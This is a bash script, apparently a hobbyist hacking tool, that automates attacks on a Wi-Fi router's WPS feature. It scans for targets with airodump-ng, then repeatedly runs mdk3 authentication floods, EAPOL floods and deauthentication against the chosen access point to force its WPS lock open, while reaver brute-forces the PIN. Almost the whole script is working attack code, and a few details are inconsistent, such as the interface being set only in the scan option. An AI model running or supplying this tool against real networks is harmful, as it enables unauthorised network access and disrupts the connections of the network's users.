#!/bin/bash
# Unlocked WPS
# By Ayoub Tachdirte
# Contact: https://www.youtube.com/c/HA-MRX

menu () {
clear
# Colors
cyan='\e[0;36m'
red='\e[1;31m'
yellow='\e[1;33m'
Green1='\033[1;32m'
NC='\033[0m'
LightGreen='\033[1;32m'
Blue='\033[1;34m'
Green='\033[0;32m'
Red='\033[1;31m'

echo -e $cyan "
                  _                     _       _ _   
                 | |                   | |     (_) |  
  _ __ ___   _   | |_ ___ _ __ ___ _ __ | | ___  _| |_ 
 | '__/ _ \| | | | __/ _ \ '__/ __| '_ \| |/ _ \| | __|
 | | | (_) | |_| | ||  __/ |  \__ \ |_) | | (_) | | |_ 
 |_|  \___/ \__,_|\__\___|_|  |___/ .__/|_|\___/|_|\__|
                                  | |                  
                                  |_|                    "
echo ""
echo -e ${yellow} "                https://www.youtube.com/c/HA-MRX"

echo -e $Green'                        .-  _           _  -.
                        /   /               \   \
                     (   (  (  (-HA-MRX-)  )  )   )
                        \   \_           _/   /
                          -                 -'
echo ""    
echo -e $Green'                    Create By HA-MRX v1.1 (English)'
echo ""
echo -e $red'  Choose what you want to do:'
echo ""
echo -e $Blue"        ${cyan}1${yellow}) ${Blue}Start Scanning to get ${Green}BSSID, ESSID & Channel${NC}."
echo -e        "        ${cyan}2${yellow}) ${Blue}Start ${Green}WPS Unlock Attack${NC} ${Blue}(If you have BSSID/ESSID)."
echo ""
echo -n -e $red'  Type your choice: >> '; tput sgr0
read choice
case $choice in
1) scan;;
2) attack;;
esac
}

scan () {
printf "${cyan}Enter the Interface to use (e.g., ${Green}wlan0 ${cyan}or ${Green}wlan1${NC}): "
read interface;
monitors
echo -e ${Red} "'Note:' ${NC}${Blue}To stop the ${Green}SCAN${Blue}, press ${NC}${Green}Ctrl+C${NC}${Blue}. Press Enter when ready:${NC}"
read click
echo "Please wait... Coping BSSID, ESSID & Channel of the target network.";
echo "After 80 seconds, it will return to menu. Select option (2) to enter details.";
gnome-terminal -- airodump-ng $interface"mon"; 
sleep 30s
menu
}

attack () {
printf "${cyan} Enter ESSID ${yellow}: ${NC}"
read essid;
printf "${cyan} Enter BSSID ${yellow}: ${NC}"
read bssid;
printf "${cyan} Enter Channel ${yellow}: ${NC}"
read channel;

while true
do
rm -f /root/reaverlog.txt
xterm -e timeout 70s mdk3 $interface"mon" a -a "$bssid" -m &
xterm -e timeout 2m mdk3 $interface"mon" x 0 -t "$bssid" -n "$essid" -s 5500 &
xterm -e timeout 2m mdk3 $interface"mon" d -c $channel &
# Reaver attack
reaver -i $interface"mon" -b "$bssid" -c $channel -vv -P >> /root/reaverlog.txt &
tail -f /root/reaverlog.txt &

if tail -f /root/reaverlog.txt | grep -q "Timeout"
then
killall reaver
killall tail
fi
killall airodump-ng &
sleep 3m
done
}

monitors () {
echo -e $Green "[+] ${cyan}Starting Monitor Mode...${NC}"
# Starting monitor mode on the selected interface
airmon-ng start $interface >> /dev/null
echo -e $Green "[+] ${cyan}Monitor mode is active on ${interface}mon.${NC}";
}

menu
